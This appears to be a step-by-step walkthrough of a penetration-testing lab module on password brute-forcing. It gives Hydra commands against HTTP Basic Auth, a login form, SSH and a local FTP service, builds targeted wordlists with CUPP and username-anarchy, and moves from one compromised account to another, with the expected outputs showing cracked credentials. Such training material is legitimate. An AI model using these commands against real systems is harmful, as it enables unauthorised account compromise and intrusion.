Below is a **step-by-step guide** with commands and typical outputs, based on the module content.  
Each step tells you what to run and what to look for to know it worked.

---

### Step 1 – Check Hydra’s help and supported services
```bash
hydra -h | grep "Supported services"
```
**Expected output (snippet):**
```
Supported services: adam6500 asterisk cisco cisco-enable cvs firebird ftp[s] http[s]-{head|get|post} http[s]-{get|post}-form http-proxy http-proxy-urlenum icq imap[s] irc ldap2[s] ldap3[-{cram|digest}md5][s] memcached mongodb mssql mysql nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] postgres radmin2 rdp redis rexec rlogin rpcap rsh rtsp s7-300 sip smb smtp[s] smtp-enum snmp socks5 ssh sshkey svn teamspeak telnet[s] vmauthd vnc xmpp
```
**Why:** Confirms that Hydra can attack HTTP, SSH, FTP, and many other services.

---

### Step 2 – Brute‑force HTTP Basic Auth with a default‑credentials wordlist
```bash
hydra -C /opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 178.211.23.155 -s 31099 http-get /
```
**Expected output (success):**
```
[DATA] max 16 tasks per 1 server, overall 16 tasks, 66 login tries, ~5 tries per task
[DATA] attacking http-get://178.211.23.155:31099/
[31099][http-get] host: 178.211.23.155   login: test   password: testingpw
[STATUS] attack finished for 178.211.23.155 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
```
**What to check:** The line with `[http-get]` shows the found credentials.  
Then you can visit `http://178.211.23.155:31099/` and log in with `test:testingpw` to verify.

---

### Step 3 – Brute‑force HTTP Basic Auth with separate username and password wordlists
```bash
hydra -L /opt/useful/SecLists/Usernames/Names/names.txt -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt -u -f 178.35.49.134 -s 32901 http-get /
```
**Expected output (after some time):**
```
[DATA] max 16 tasks per 1 server, overall 16 tasks, 243854766 login tries (l:17/p:14344398), ~15240923 tries per task
...
[32901][http-get] host: 178.35.49.134   login: thomas   password: thomas1
[STATUS] attack finished for 178.35.49.134 (valid pair found)
```
**What to check:** Look for a line with `[http-get]` showing a valid pair. The attack may take a long time; the `-f` flag stops as soon as one is found.

---

### Step 4 – Brute‑force a login form (POST) with a static username
First, determine the form parameters (see Step 5). Then run:
```bash
hydra -l admin -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt -f 178.35.49.134 -s 32901 http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"
```
**Expected output:**
```
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
...
[32901][http-post-form] host: 178.35.49.134   login: admin   password: password123
[STATUS] attack finished for 178.35.49.134 (valid pair found)
```
**What to check:** The line with `[http-post-form]` shows the found password for user `admin`. Then log in via the web form to confirm.

---

### Step 5 – Capture POST parameters using your browser
1. Open Firefox, press `Ctrl+Shift+E` to open the Network panel.  
2. Try to log in with any credentials (e.g., `test:test`).  
3. Right‑click the login request → **Copy** → **Copy POST data**.  
**Expected result:**  
```
username=test&password=test
```
**Why:** This gives the exact parameter names and format to use in Hydra’s `http-post-form` string.

---

### Step 6 – Create a custom password wordlist with CUPP
```bash
cupp -i
```
Answer the questions (e.g., first name: William, surname: Gates, etc.).  
**Expected output:**
```
[+] Now making a dictionary...
[+] Sorting list and removing duplicates...
[+] Saving dictionary to william.txt, counting 43368 words.
```
**What to check:** A file `william.txt` is created in the current directory.

---

### Step 7 – Filter the wordlist according to a password policy
```bash
sed -ri '/^.{,7}$/d' william.txt            # remove shorter than 8
sed -ri '/[!-/:-@\[-`\{-~]+/!d' william.txt # keep only those with a special char
sed -ri '/[0-9]+/!d' william.txt            # keep only those with a number
```
**Expected result:** The wordlist size decreases (e.g., from 43k to ~13k).  
**What to check:** Run `wc -l william.txt` before and after to see the reduction.

---

### Step 8 – Generate a custom username list
```bash
git clone https://github.com/urbanadventurer/username-anarchy.git
cd username-anarchy
./username-anarchy Bill Gates > bill.txt
```
**Expected output:** No output, but the file `bill.txt` contains a list of usernames.  
**What to check:** `head bill.txt` to see entries like `b.gates`, `bill.gates`, `bgates`, etc.

---

### Step 9 – Brute‑force SSH with custom wordlists
```bash
hydra -L bill.txt -P william.txt -u -f ssh://178.35.49.134:22 -t 4
```
**Expected output:**
```
[DATA] max 4 tasks per 1 server, overall 4 tasks, 157116 login tries (l:12/p:13093), ~39279 tries per task
...
[22][ssh] host: 178.35.49.134   login: b.gates   password: ...SNIP...
[STATUS] attack finished for 178.35.49.134 (valid pair found)
```
**What to check:** The line with `[ssh]` shows the found username and password. Then log in via SSH:
```bash
ssh b.gates@178.35.49.134 -p 22
```

---

### Step 10 – After gaining SSH access, enumerate other users and services
Inside the SSH session:
```bash
ls /home
```
**Expected output:**
```
b.gates  m.gates
```
Then check listening ports:
```bash
netstat -antp | grep -i list
```
**Expected output:**
```
tcp        0      0 127.0.0.1:21            0.0.0.0:*               LISTEN      - 
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
```
**What to check:** Another user `m.gates` and an FTP service listening locally on port 21.

---

### Step 11 – Brute‑force FTP locally
From the SSH session:
```bash
hydra -l m.gates -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou-10.txt ftp://127.0.0.1
```
**Expected output:**
```
[DATA] max 16 tasks per 1 server, overall 16 tasks, 92 login tries (l:1/p:92), ~6 tries per task
...
[21][ftp] host: 127.0.0.1   login: m.gates   password: <...SNIP...>
1 of 1 target successfully completed, 1 valid password found
```
**What to check:** The line with `[ftp]` shows the password for `m.gates`.

---

### Step 12 – Connect to FTP or switch to that user
```bash
ftp 127.0.0.1
```
Enter `m.gates` and the password when prompted.  
**Expected output:**
```
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
200 PORT command successful.
150 Here comes the directory listing.
-rw-------    1 1001     1001           33 Sep 11 00:06 flag.txt
226 Directory send OK.
```
Or switch to the user on the system:
```bash
su - m.gates
```
Enter the password.  
**Expected output:**
```
m.gates@bruteforcing:~$ whoami
m.gates
```

---

### Summary of Key Points to Check
| Step | What to look for |
|------|------------------|
| 2    | `[http-get] ... login: test password: testingpw` |
| 3    | `[http-get] ... login: thomas password: thomas1` |
| 4    | `[http-post-form] ... login: admin password: password123` |
| 5    | POST data like `username=test&password=test` |
| 6    | `william.txt` created with many lines |
| 7    | Reduced wordlist size (e.g., `wc -l william.txt`) |
| 8    | `bill.txt` contains multiple username variants |
| 9    | `[ssh] ... login: b.gates password: ...` |
| 10   | Output of `ls /home` showing `m.gates`, and `netstat` showing port 21 listening |
| 11   | `[ftp] ... login: m.gates password: ...` |
| 12   | Successful FTP login or `su` gives a shell as `m.gates` |

Follow these steps in order, adjusting IPs, ports, and file paths to match your target. Always verify that you have permission to test before running any brute‑force attack.
